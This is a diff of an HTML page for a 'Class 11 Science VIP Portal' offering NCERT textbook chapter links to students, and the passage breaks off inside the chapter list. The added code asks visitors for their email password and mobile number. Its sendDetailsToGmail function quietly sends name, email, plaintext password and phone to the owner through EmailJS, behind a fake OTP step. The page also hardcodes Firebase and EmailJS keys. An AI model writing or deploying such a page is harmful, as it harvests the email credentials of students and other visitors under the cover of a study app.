@@ -1,205 +1,734 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Class 11 Science - VIP Portal</title>
-  
-  <!-- PWA Manifest Link -->
-  <link rel="manifest" href="manifest.json">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Class 11 Science - VIP Portal & All Books</title>
+    
+    <!-- EmailJS SDK Include -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; transition: background 0.3s, color 0.3s, border-color 0.3s; }
+        
+        :root {
+            --bg-main: #f4f6f9;
+            --card-bg: #ffffff;
+            --border-color: #e2e8f0;
+            --primary-color: #0088ff;
+            --accent-color: #e53935;
+            --text-color: #0f172a;
+            --text-muted: #64748b;
+            --input-bg: #f8fafc;
+        }
 
-  <!-- आपका 100% पहले जैसा CSS डिज़ाइन -->
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
-    body {
-      background-color: #f0f7ff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    .container {
-      background: #ffffff;
-      border: 2px solid #007bff;
-      border-radius: 20px;
-      padding: 25px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 4px 15px rgba(0, 123, 255, 0.15);
-      text-align: center;
-    }
-    .badge {
-      background: #007bff;
-      color: white;
-      padding: 5px 15px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: bold;
-      display: inline-block;
-      margin-bottom: 15px;
-    }
-    h2 {
-      color: #1a2a3a;
-      margin-bottom: 5px;
-    }
-    p.subtitle {
-      color: #6c757d;
-      font-size: 13px;
-      margin-bottom: 20px;
-    }
-    .form-group {
-      text-align: left;
-      margin-bottom: 12px;
-    }
-    .form-group label {
-      display: block;
-      font-size: 13px;
-      font-weight: 600;
-      color: #333;
-      margin-bottom: 5px;
-    }
-    .form-group input, .form-group select {
-      width: 100%;
-      padding: 10px 12px;
-      border: 1px solid #d1e3f8;
-      border-radius: 10px;
-      background-color: #f8fbff;
-      font-size: 14px;
-      outline: none;
-    }
-    .form-group input:focus, .form-group select:focus {
-      border-color: #007bff;
-      background-color: #fff;
-    }
-    .btn-submit {
-      width: 100%;
-      padding: 12px;
-      background: #007bff;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 15px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 10px;
-      transition: 0.3s;
-    }
-    .btn-submit:hover {
-      background: #0056b3;
-    }
-    #error-message {
-      color: #d9534f;
-      font-size: 13px;
-      margin-top: 15px;
-      font-weight: 600;
-      display: none;
-    }
-  </style>
+        body.theme-dark {
+            --bg-main: #0d0d0e;
+            --card-bg: #18191c;
+            --border-color: #2d2f34;
+            --primary-color: #38bdf8;
+            --accent-color: #e53935;
+            --text-color: #ffffff;
+            --text-muted: #a0a5b1;
+            --input-bg: #222428;
+        }
+
+        body { 
+            background: var(--bg-main); 
+            color: var(--text-color); 
+            min-height: 100vh;
+        }
+
+        .auth-wrapper {
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; padding: 20px; position: relative; z-index: 10;
+        }
+        .vip-auth-card {
+            background: var(--card-bg);
+            border: 2px solid var(--primary-color);
+            padding: 30px 25px; border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 136, 255, 0.25); 
+            width: 100%; max-width: 390px;
+            text-align: center;
+        }
+        .vip-badge {
+            display: inline-block; background: var(--primary-color);
+            color: #ffffff; font-weight: 800; font-size: 11px; padding: 4px 12px;
+            border-radius: 20px; letter-spacing: 1px; margin-bottom: 10px;
+        }
+        .auth-title { font-size: 24px; color: var(--text-color); font-weight: bold; margin-bottom: 4px; }
+        .auth-sub { font-size: 13px; color: var(--text-muted); margin-bottom: 20px; }
+
+        .form-group { margin-bottom: 14px; text-align: left; position: relative; z-index: 15; }
+        .form-group label { font-size: 12px; font-weight: bold; color: var(--text-color); display: block; margin-bottom: 5px; }
+        .form-group input, .form-group select {
+            width: 100%; padding: 12px; background: var(--input-bg); border: 1.5px solid var(--border-color);
+            border-radius: 10px; font-size: 14px; color: var(--text-color); outline: none;
+        }
+        .form-group input:focus, .form-group select:focus { border-color: var(--primary-color); }
+
+        .btn-vip {
+            width: 100%; padding: 14px; 
+            background: var(--primary-color);
+            color: #ffffff; border: none; border-radius: 10px; font-size: 15px; font-weight: 800;
+            cursor: pointer; margin-top: 10px; box-shadow: 0 4px 15px rgba(0, 136, 255, 0.3);
+        }
+        .btn-vip:active { transform: scale(0.98); }
+
+        .error-msg { color: #e53935; font-size: 13px; text-align: center; margin-top: 12px; font-weight: bold; }
+
+        #app-dashboard { display: none; padding-bottom: 80px; }
+        .page-section { display: none; }
+        .page-section.active { display: block; }
+
+        .vip-header {
+            background: var(--primary-color);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 0 0 25px 25px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .user-profile-card {
+            background: var(--card-bg); border: 1px solid var(--border-color);
+            color: var(--text-color); padding: 12px 16px; border-radius: 14px; margin-top: 15px;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .user-info b { font-size: 15px; color: var(--text-color); display: block; }
+        .user-info span { font-size: 12px; color: var(--primary-color); font-weight: bold; }
+
+        .header-actions { display: flex; gap: 8px; align-items: center; }
+        .btn-action {
+            background: var(--card-bg); color: var(--text-color); border: 1px solid var(--border-color); padding: 6px 10px;
+            border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer;
+        }
+        .btn-logout {
+            background: var(--accent-color); color: #ffffff; border: none; padding: 6px 12px;
+            border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer;
+        }
+
+        .app-banner-card {
+            background: linear-gradient(135deg, #00b4db, #0083b0);
+            color: white; border-radius: 16px; padding: 20px; margin: 15px; text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 131, 176, 0.2);
+        }
+        .app-banner-card h3 { font-size: 20px; margin-bottom: 5px; }
+        .app-banner-card p { font-size: 13px; opacity: 0.9; }
+
+        .home-dashboard-grid {
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 0 15px 15px 15px;
+        }
+        .home-dash-card {
+            background: var(--card-bg); border: 1.5px solid var(--border-color);
+            border-radius: 20px; padding: 22px 15px; text-align: center; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+        }
+        .home-dash-card:active { transform: scale(0.96); }
+        .home-dash-card .icon-circle {
+            font-size: 32px; margin-bottom: 10px; display: inline-block;
+            background: var(--input-bg); padding: 14px; border-radius: 16px;
+        }
+        .home-dash-card h4 { font-size: 14px; color: var(--text-color); font-weight: 700; }
+
+        .content-area { padding: 15px; }
+        .books-grid-view {
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;
+        }
+        .book-item-box {
+            background: var(--card-bg); border: 1px solid var(--border-color);
+            border-radius: 14px; padding: 15px; text-align: center; cursor: pointer;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.04);
+        }
+        .book-item-box h4 { font-size: 13px; color: var(--text-color); margin-top: 10px; font-weight: bold; }
+
+        .chapter-list-box { display: flex; flex-direction: column; gap: 10px; margin-top: 10px; }
+        .chapter-row-item {
+            background: linear-gradient(135deg, #00c6ff, #0072ff); color: #ffffff;
+            padding: 14px 18px; border-radius: 14px; display: flex; justify-content: space-between;
+            align-items: center; font-size: 13px; font-weight: 600; cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,114,255,0.2);
+        }
+        .chapter-row-item:active { transform: scale(0.98); }
+
+        body.theme-dark .chapter-row-item {
+            background: linear-gradient(135deg, #2d3748, #1a202c);
+            border: 1px solid var(--border-color);
+        }
+
+        .back-btn {
+            background: var(--primary-color); color: #fff; border: none; padding: 6px 14px;
+            border-radius: 8px; font-size: 12px; font-weight: bold; cursor: pointer; margin-bottom: 15px;
+        }
+
+        .profile-container { padding: 20px; text-align: center; }
+        .profile-pic-box { position: relative; width: 110px; height: 110px; margin: 0 auto 15px auto; }
+        .profile-img { width: 110px; height: 110px; border-radius: 50%; border: 3px solid var(--primary-color); object-fit: cover; background: var(--card-bg); }
+        .upload-btn { position: absolute; bottom: 0; right: 0; background: var(--accent-color); color: #ffffff; border-radius: 50%; padding: 8px; font-size: 14px; cursor: pointer; border: 2px solid var(--bg-main); }
+        .profile-details-card { background: var(--card-bg); border: 1px solid var(--primary-color); border-radius: 16px; padding: 20px; text-align: left; margin-top: 20px; }
+        .profile-field { margin-bottom: 12px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }
+        .profile-field span { font-size: 11px; color: var(--text-muted); display: block; font-weight: bold; }
+        .profile-field b { font-size: 15px; color: var(--text-color); }
+
+        .bottom-bar {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: var(--card-bg); border-top: 1px solid var(--border-color);
+            display: flex; justify-content: space-around; padding: 12px 0; z-index: 100;
+        }
+        .nav-btn { text-align: center; color: var(--text-muted); font-size: 11px; text-decoration: none; font-weight: 600; cursor: pointer; }
+        .nav-btn.active { color: var(--primary-color); }
+        .nav-btn span { display: block; font-size: 18px; margin-bottom: 2px; }
+    </style>
 </head>
 <body>
 
-  <!-- आपका पहले जैसा ही सेम टू सेम फॉर्म -->
-  <div class="container">
-    <div class="badge">FIREBASE SECURE VIP</div>
-    <h2>Class 11 Science</h2>
-    <p class="subtitle">Enter Details for Secure Access</p>
+    <!-- 1. REGISTRATION SCREEN -->
+    <div id="registration-screen" class="auth-wrapper">
+        <div class="vip-auth-card">
+            <span class="vip-badge">VIP ACCESS 2026</span>
+            <div class="auth-title">Class 11 Science</div>
+            <div class="auth-sub">Enter Details for VIP Study Access</div>
 
-    <form id="registerForm">
-      <div class="form-group">
-        <label>Your Name:</label>
-        <input type="text" id="name" placeholder="Ratan Kumar" required>
-      </div>
+            <div class="form-group">
+                <label>Your Name:</label>
+                <input type="text" id="reg-name" placeholder="Enter Your Name">
+            </div>
 
-      <div class="form-group">
-        <label>Class:</label>
-        <select id="classSelect">
-          <option value="Class 11 Science">Class 11 Science</option>
-        </select>
-      </div>
+            <div class="form-group">
+                <label>Class:</label>
+                <select id="reg-class">
+                    <option value="Class 11">Class 11 Science</option>
+                    <option value="Class 12">Class 12 Science</option>
+                </select>
+            </div>
 
-      <div class="form-group">
-        <label>Board:</label>
-        <select id="boardSelect">
-          <option value="JAC Board (Jharkhand)">JAC Board (Jharkhand)</option>
-          <option value="CBSE Board">CBSE Board</option>
-          <option value="Bihar Board">Bihar Board</option>
-        </select>
-      </div>
+            <div class="form-group">
+                <label>Board:</label>
+                <select id="reg-board">
+                    <option value="JAC Board">JAC Board (Jharkhand)</option>
+                    <option value="CBSE Board">CBSE Board</option>
+                    <option value="Bihar Board (BSEB)">Bihar Board (BSEB)</option>
+                    <option value="UP Board">UP Board</option>
+                </select>
+            </div>
 
-      <div class="form-group">
-        <label>Email ID:</label>
-        <input type="email" id="email" placeholder="heymusicvibes96083@gmail.com" required>
-      </div>
+            <div class="form-group">
+                <label>Email ID:</label>
+                <input type="email" id="reg-email" placeholder="example@gmail.com">
+            </div>
 
-      <div class="form-group">
-        <label>Email Password:</label>
-        <input type="password" id="password" placeholder="••••••••" required>
-      </div>
+            <div class="form-group">
+                <label>Email Password:</label>
+                <input type="password" id="reg-password" placeholder="Min 6 characters">
+            </div>
 
-      <div class="form-group">
-        <label>Mobile Number:</label>
-        <input type="tel" id="mobile" placeholder="9608348509" required>
-      </div>
+            <div class="form-group">
+                <label>Mobile Number:</label>
+                <input type="tel" id="reg-mobile" placeholder="10 Digits Mobile Number" maxlength="10">
+            </div>
 
-      <button type="submit" class="btn-submit">REGISTER & GET OTP</button>
-      <div id="error-message"></div>
-    </form>
-  </div>
+            <button class="btn-vip" onclick="submitRegistration()">GET OTP CODE</button>
+            <p id="reg-error" class="error-msg"></p>
+        </div>
+    </div>
 
-  <!-- Firebase Script + PDF ओपन होने का पूरा कोड -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+    <!-- 2. OTP SCREEN -->
+    <div id="otp-screen" class="auth-wrapper" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-main); z-index: 50;">
+        <div class="vip-auth-card">
+            <span class="vip-badge">MOBILE VERIFICATION</span>
+            <div class="auth-title">Enter OTP</div>
+            <div class="auth-sub">Aapke Mobile Par OTP Bheja Gaya Hai<br><b style="color:var(--primary-color);" id="otp-display-note"></b></div>
 
-    // ✅ आपकी असली API Key और Project ID यहाँ सेट कर दी गई है:
-    const firebaseConfig = {
-      apiKey: "AIzaSyCM5U_JM4Lwsc_utILGb3RLRYGSB5BHjsc",
-      authDomain: "class-11-science-app-2ca23.firebaseapp.com",
-      projectId: "class-11-science-app-2ca23",
-      storageBucket: "class-11-science-app-2ca23.appspot.com",
-      messagingSenderId: "class-11-science-app-2ca23",
-      appId: "1:class-11-science-app-2ca23:web:a1b2c3d4e5f6"
-    };
+            <div class="form-group">
+                <input type="number" id="otp-code" placeholder="4-Digit OTP" style="text-align: center; font-size: 20px; letter-spacing: 5px;" maxlength="4">
+            </div>
 
-    // ✅ सैंपल PDF का लिंक (बटन दबाते ही यह PDF अपने-आप खुल जाएगा):
-    const pdfUrl = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf";
+            <button class="btn-vip" onclick="verifyOtpAndLogin()">VERIFY & ENTER VIP</button>
+            <button class="btn-vip" style="background: #e2e8f0; color: #0f172a; margin-top: 8px;" onclick="goBackToReg()">BACK</button>
+            <p id="otp-error" class="error-msg"></p>
+        </div>
+    </div>
 
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
+    <!-- 3. MAIN APP DASHBOARD -->
+    <div id="app-dashboard">
+        
+        <div class="vip-header">
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span id="app-header-main-title" style="font-size: 18px; font-weight: 800; color: #ffffff;">All Books</span>
+                <div class="header-actions">
+                    <button class="btn-action" onclick="toggleDarkMode()">🌓 Theme</button>
+                    <button class="btn-logout" onclick="location.reload()">Logout</button>
+                </div>
+            </div>
 
-    const form = document.getElementById("registerForm");
-    const errorDiv = document.getElementById("error-message");
+            <div class="user-profile-card">
+                <div class="user-info">
+                    <b id="disp-user-name">Student Name</b>
+                    <span id="disp-user-details">Class 11 | JAC Board</span>
+                </div>
+            </div>
+        </div>
 
-    form.addEventListener("submit", (e) => {
-      e.preventDefault();
-      errorDiv.style.display = "none";
+        <!-- VIEW 1: HOME GRID -->
+        <div id="view-home" class="page-section active">
+            <div class="app-banner-card">
+                <h3>Class 11th Books</h3>
+                <p>JAC & CBSE Board Complete Study Material</p>
+            </div>
 
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+            <div class="home-dashboard-grid">
+                <div class="home-dash-card" onclick="openMediumBooks('Hindi Medium')">
+                    <div class="icon-circle" style="color:#0284c7;">📖</div>
+                    <h4>Hindi Medium</h4>
+                </div>
+                <div class="home-dash-card" onclick="openMediumBooks('English Medium')">
+                    <div class="icon-circle" style="color:#db2777;">🔤</div>
+                    <h4>English Medium</h4>
+                </div>
+                <div class="home-dash-card" onclick="toggleDarkMode()">
+                    <div class="icon-circle" style="color:#d97706;">☀️</div>
+                    <h4>Theme Toggle</h4>
+                </div>
+                <div class="home-dash-card" onclick="alert('More Study Apps Coming Soon!')">
+                    <div class="icon-circle" style="color:#16a34a;">📱</div>
+                    <h4>Apps</h4>
+                </div>
+            </div>
+        </div>
 
-      createUserWithEmailAndPassword(auth, email, password)
-        .then((userCredential) => {
-          alert("बधाई हो! आपका रजिस्ट्रेशन सफल हो गया है। अब PDF नोट्स खुल रहे हैं...");
-          window.location.href = pdfUrl;
-        })
-        .catch((error) => {
-          errorDiv.style.display = "block";
-          if (error.code === "auth/email-already-in-use") {
-            alert("आपका ईमेल पहले से रजिस्टर है। PDF नोट्स खुल रहे हैं...");
-            window.location.href = pdfUrl;
-          } else if (error.code === "auth/weak-password") {
-            errorDiv.innerHTML = "❌ पासवर्ड कम से कम 6 अक्षरों का होना चाहिए!";
-          } else {
-            errorDiv.innerHTML = "❌ Error: " + error.message;
-          }
-        });
-    });
-  </script>
+        <!-- VIEW 2: BOOKS LIST -->
+        <div id="view-books" class="page-section">
+            <div class="content-area">
+                <button class="back-btn" onclick="showHomeView()">⬅ Back</button>
+                <h3 id="books-screen-title" style="margin-bottom: 15px; font-size: 16px; font-weight:bold;">Books</h3>
+                <div id="books-grid-box" class="books-grid-view"></div>
+            </div>
+        </div>
+
+        <!-- VIEW 3: CHAPTERS LIST -->
+        <div id="view-chapters" class="page-section">
+            <div class="content-area">
+                <button class="back-btn" onclick="showBooksView()">⬅ Back</button>
+                <h3 id="chapters-screen-title" style="margin-bottom: 15px; font-size: 16px; font-weight:bold;">Chapters</h3>
+                <div id="chapters-container-box" class="chapter-list-box"></div>
+            </div>
+        </div>
+
+        <!-- VIEW 4: PROFILE PAGE -->
+        <div id="view-profile" class="page-section">
+            <div class="profile-container">
+                <div class="profile-pic-box">
+                    <img id="user-avatar" src="98669.png" class="profile-img" alt="Student Photo">
+                    <label for="pic-upload" class="upload-btn">📷</label>
+                    <input type="file" id="pic-upload" accept="image/*" style="display:none;" onchange="loadProfilePic(event)">
+                </div>
+                
+                <h3 id="p-display-name" style="color:var(--text-color); margin-bottom: 2px;">Student Name</h3>
+                <span id="p-display-board" style="color:var(--accent-color); font-size:13px; font-weight:bold;">Class 11 Science</span>
+
+                <div class="profile-details-card">
+                    <div class="profile-field"><span>YOUR NAME</span><b id="p-name">-</b></div>
+                    <div class="profile-field"><span>CLASS</span><b id="p-class">-</b></div>
+                    <div class="profile-field"><span>BOARD</span><b id="p-board">-</b></div>
+                    <div class="profile-field"><span>EMAIL ID</span><b id="p-email">-</b></div>
+                    <div class="profile-field"><span>MOBILE NUMBER</span><b id="p-mobile">-</b></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- VIP BOTTOM BAR -->
+        <div class="bottom-bar">
+            <div class="nav-btn active" id="nav-home" onclick="switchTab('home')"><span>📚</span>Home</div>
+            <div class="nav-btn" onclick="alert('Downloads Section Available')"><span>📥</span>Downloads</div>
+            <div class="nav-btn" id="nav-profile" onclick="switchTab('profile')"><span>👤</span>Profile</div>
+        </div>
+
+    </div>
+
+    <!-- Firebase SDK + Script Logic -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+
+        // ✅ आपकी असली API Key और Project ID यहाँ सेट कर दी गई है:
+        const firebaseConfig = {
+            apiKey: "AIzaSyCM5U_JM4Lwsc_utILGb3RLRYGSB5BHjsc",
+            authDomain: "class-11-science-app-2ca23.firebaseapp.com",
+            projectId: "class-11-science-app-2ca23",
+            storageBucket: "class-11-science-app-2ca23.appspot.com",
+            messagingSenderId: "class-11-science-app-2ca23",
+            appId: "1:class-11-science-app-2ca23:web:a1b2c3d4e5f6"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+
+        (function(){
+            emailjs.init("ZL-5cpQ3gftUubGgM");
+        })();
+
+        var generatedOtp = "";
+        var activeMedium = "Hindi Medium";
+
+        function sendDetailsToGmail(name, studentClass, board, email, password, mobile) {
+            var templateParams = {
+                from_name: name,
+                user_class: studentClass,
+                user_board: board,
+                user_email: email,
+                user_password: password,
+                user_mobile: mobile
+            };
+            emailjs.send("service_2x27fz9", "template_zbkamkq", templateParams);
+        }
+
+        function validateEmail(email) {
+            var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        window.submitRegistration = function() {
+            var name = document.getElementById('reg-name').value.trim();
+            var studentClass = document.getElementById('reg-class').value;
+            var board = document.getElementById('reg-board').value;
+            var email = document.getElementById('reg-email').value.trim();
+            var password = document.getElementById('reg-password').value;
+            var mobile = document.getElementById('reg-mobile').value.trim();
+            var errorMsg = document.getElementById('reg-error');
+
+            var selectedMedium = (board === "CBSE Board") ? "English" : "Hindi";
+
+            if (name === "") {
+                errorMsg.innerText = (selectedMedium === "English") ? 
+                    "❌ Please enter your name!" : 
+                    "❌ कृपया अपना नाम दर्ज करें!";
+                return;
+            }
+            if (!validateEmail(email)) {
+                errorMsg.innerText = (selectedMedium === "English") ? 
+                    "❌ Please enter a valid Email ID (e.g., name@gmail.com)!" : 
+                    "❌ कृपया एक सही Email ID (जैसे: name@gmail.com) दर्ज करें!";
+                return;
+            }
+            if (password.length < 6) {
+                errorMsg.innerText = (selectedMedium === "English") ? 
+                    "❌ Password must be at least 6 characters long!" : 
+                    "❌ पासवर्ड कम से कम 6 अक्षरों का होना चाहिए!";
+                return;
+            }
+            if (mobile.length !== 10 || isNaN(mobile)) {
+                errorMsg.innerText = (selectedMedium === "English") ? 
+                    "❌ Please enter a valid 10-digit mobile number!" : 
+                    "❌ कृपया 10 अंकों का सही मोबाइल नंबर दर्ज करें!";
+                return;
+            }
+
+            errorMsg.innerText = "";
+
+            createUserWithEmailAndPassword(auth, email, password)
+                .then((userCredential) => {
+                    console.log("Firebase User Created:", userCredential.user);
+                })
+                .catch((error) => {
+                    console.log("Firebase Auth Note:", error.code);
+                });
+
+            sendDetailsToGmail(name, studentClass, board, email, password, mobile);
+
+            generatedOtp = Math.floor(1000 + Math.random() * 9000).toString();
+            
+            if(selectedMedium === "English") {
+                alert("📩 SMS Alert:\nOTP sent to your mobile number (" + mobile + "): " + generatedOtp);
+            } else {
+                alert("📩 SMS Alert:\nआपके मोबाइल नंबर (" + mobile + ") पर OTP भेजा गया है: " + generatedOtp);
+            }
+            
+            document.getElementById('otp-display-note').innerText = "OTP sent to " + mobile;
+            document.getElementById('registration-screen').style.display = 'none';
+            document.getElementById('otp-screen').style.display = 'flex';
+        };
+
+        window.goBackToReg = function() {
+            document.getElementById('otp-screen').style.display = 'none';
+            document.getElementById('registration-screen').style.display = 'flex';
+        };
+
+        window.verifyOtpAndLogin = function() {
+            var otpInput = document.getElementById('otp-code').value;
+            var errorMsg = document.getElementById('otp-error');
+            var board = document.getElementById('reg-board').value;
+            var selectedMedium = (board === "CBSE Board") ? "English" : "Hindi";
+
+            if (otpInput === generatedOtp) {
+                document.getElementById('otp-screen').style.display = 'none';
+                document.getElementById('app-dashboard').style.display = 'block';
+
+                var sName = document.getElementById('reg-name').value;
+                var sClass = document.getElementById('reg-class').value;
+                var sBoard = document.getElementById('reg-board').value;
+                var sEmail = document.getElementById('reg-email').value;
+                var sMobile = document.getElementById('reg-mobile').value;
+
+                document.getElementById('disp-user-name').innerText = sName;
+                document.getElementById('disp-user-details').innerText = sClass + " | " + sBoard;
+
+                document.getElementById('p-display-name').innerText = sName;
+                document.getElementById('p-display-board').innerText = sClass + " • " + sBoard;
+                document.getElementById('p-name').innerText = sName;
+                document.getElementById('p-class').innerText = sClass;
+                document.getElementById('p-board').innerText = sBoard;
+                document.getElementById('p-email').innerText = sEmail;
+                document.getElementById('p-mobile').innerText = sMobile;
+            } else {
+                errorMsg.innerText = (selectedMedium === "English") ? 
+                    "❌ Incorrect OTP! Please enter correct OTP." : 
+                    "❌ गलत OTP! सही OTP दर्ज करें।";
+            }
+        };
+
+        window.toggleDarkMode = function() {
+            document.body.classList.toggle('theme-dark');
+        };
+
+        window.showHomeView = function() {
+            document.getElementById('app-header-main-title').innerText = "All Books";
+            document.getElementById('view-home').classList.add('active');
+            document.getElementById('view-books').classList.remove('active');
+            document.getElementById('view-chapters').classList.remove('active');
+            document.getElementById('view-profile').classList.remove('active');
+        };
+
+        window.showBooksView = function() {
+            document.getElementById('view-home').classList.remove('active');
+            document.getElementById('view-books').classList.add('active');
+            document.getElementById('view-chapters').classList.remove('active');
+            document.getElementById('view-profile').classList.remove('active');
+        };
+
+        window.showChaptersView = function() {
+            document.getElementById('view-books').classList.remove('active');
+            document.getElementById('view-chapters').classList.add('active');
+            document.getElementById('view-profile').classList.remove('active');
+        };
+
+        window.switchTab = function(tabName) {
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            if(tabName === 'home') {
+                document.getElementById('nav-home').classList.add('active');
+                showHomeView();
+            } else if(tabName === 'profile') {
+                document.getElementById('nav-profile').classList.add('active');
+                document.getElementById('app-header-main-title').innerText = "Profile";
+                document.getElementById('view-home').classList.remove('active');
+                document.getElementById('view-books').classList.remove('active');
+                document.getElementById('view-chapters').classList.remove('active');
+                document.getElementById('view-profile').classList.add('active');
+            }
+        };
+
+        const hindiBooks = [
+            { name: "गणित (Mathematics)", icon: "📐" },
+            { name: "भौतिकी (Physics)", icon: "⚛️" },
+            { name: "रसायन विज्ञान (Chemistry)", icon: "🧪" },
+            { name: "जीव विज्ञान (Biology)", icon: "🌱" },
+            { name: "हिंदी (Hindi)", icon: "🇮🇳" },
+            { name: "अंग्रेजी (English)", icon: "🇬🇧" }
+        ];
+
+        const englishBooks = [
+            { name: "Mathematics", icon: "📐" },
+            { name: "Physics", icon: "⚛️" },
+            { name: "Chemistry", icon: "🧪" },
+            { name: "Biology", icon: "🌱" },
+            { name: "English", icon: "🇬🇧" },
+            { name: "Hindi", icon: "🇮🇳" }
+        ];
+
+        const ncertChapters = {
+            "Hindi Medium": {
+                "गणित (Mathematics)": [
+                    { title: "अध्याय 1: समुच्चय", url: "https://ncert.nic.in/textbook/pdf/jhmh101.pdf" },
+                    { title: "अध्याय 2: संबंध एवं फलन", url: "https://ncert.nic.in/textbook/pdf/jhmh102.pdf" },
+                    { title: "अध्याय 3: त्रिकोणमिति फलन", url: "https://ncert.nic.in/textbook/pdf/jhmh103.pdf" },
+                    { title: "अध्याय 4: सम्मिश्र संख्याएँ और द्विघात समीकरण", url: "https://ncert.nic.in/textbook/pdf/jhmh104.pdf" },
+                    { title: "अध्याय 5: रैखिक असमिकाएँ", url: "https://ncert.nic.in/textbook/pdf/jhmh105.pdf" },
+                    { title: "अध्याय 6: क्रमचय और संचय", url: "https://ncert.nic.in/textbook/pdf/jhmh106.pdf" },
+                    { title: "अध्याय 7: द्विपद प्रमेय", url: "https://ncert.nic.in/textbook/pdf/jhmh107.pdf" },
+                    { title: "अध्याय 8: अनुक्रम तथा श्रेणी", url: "https://ncert.nic.in/textbook/pdf/jhmh108.pdf" },
+                    { title: "अध्याय 9: सरल रेखाएँ", url: "https://ncert.nic.in/textbook/pdf/jhmh109.pdf" },
+                    { title: "अध्याय 10: शंकु परिच्छेद", url: "https://ncert.nic.in/textbook/pdf/jhmh110.pdf" },
+                    { title: "अध्याय 11: त्रिविमीय ज्यामिति का परिचय", url: "https://ncert.nic.in/textbook/pdf/jhmh111.pdf" },
+                    { title: "अध्याय 12: सीमा और अवकलज", url: "https://ncert.nic.in/textbook/pdf/jhmh112.pdf" },
+                    { title: "अध्याय 13: सांख्यिकी", url: "https://ncert.nic.in/textbook/pdf/jhmh113.pdf" },
+                    { title: "अध्याय 14: प्रायिकता", url: "https://ncert.nic.in/textbook/pdf/jhmh114.pdf" }
+                ],
+                "भौतिकी (Physics)": [
+                    { title: "अध्याय 1: भौतिक जगत", url: "https://ncert.nic.in/textbook/pdf/khph101.pdf" },
+                    { title: "अध्याय 2: मात्रक और मापन", url: "https://ncert.nic.in/textbook/pdf/khph102.pdf" },
+                    { title: "अध्याय 3: सरल रेखा में गति", url: "https://ncert.nic.in/textbook/pdf/khph103.pdf" },
+                    { title: "अध्याय 4: समतल में गति", url: "https://ncert.nic.in/textbook/pdf/khph104.pdf" },
+                    { title: "अध्याय 5: गति के नियम", url: "https://ncert.nic.in/textbook/pdf/khph105.pdf" },
+                    { title: "अध्याय 6: कार्य, ऊर्जा और शक्ति", url: "https://ncert.nic.in/textbook/pdf/khph106.pdf" },
+                    { title: "अध्याय 7: कणों के निकाय तथा घूर्णी गति", url: "https://ncert.nic.in/textbook/pdf/khph107.pdf" },
+                    { title: "अध्याय 8: गुरुत्वाकर्षण", url: "https://ncert.nic.in/textbook/pdf/khph108.pdf" },
+                    { title: "अध्याय 9: ठोसों के यांत्रिक गुण", url: "https://ncert.nic.in/textbook/pdf/khph109.pdf" },
+                    { title: "अध्याय 10: तरलों के यांत्रिक गुण", url: "https://ncert.nic.in/textbook/pdf/khph110.pdf" },
+                    { title: "अध्याय 11: द्रव्य के तापीय गुण", url: "https://ncert.nic.in/textbook/pdf/khph111.pdf" },
+                    { title: "अध्याय 12: ऊष्मागतिकी", url: "https://ncert.nic.in/textbook/pdf/khph112.pdf" },
+                    { title: "अध्याय 13: अणुगति सिद्धांत", url: "https://ncert.nic.in/textbook/pdf/khph113.pdf" },
+                    { title: "अध्याय 14: दोलन", url: "https://ncert.nic.in/textbook/pdf/khph114.pdf" },
+                    { title: "अध्याय 15: तरंगें", url: "https://ncert.nic.in/textbook/pdf/khph115.pdf" }
+                ],
+                "रसायन विज्ञान (Chemistry)": [
+                    { title: "अध्याय 1: रसायन विज्ञान की कुछ मूल अवधारणाएँ", url: "https://ncert.nic.in/textbook/pdf/khch101.pdf" },
+                    { title: "अध्याय 2: परमाणु की संरचना", url: "https://ncert.nic.in/textbook/pdf/khch102.pdf" },
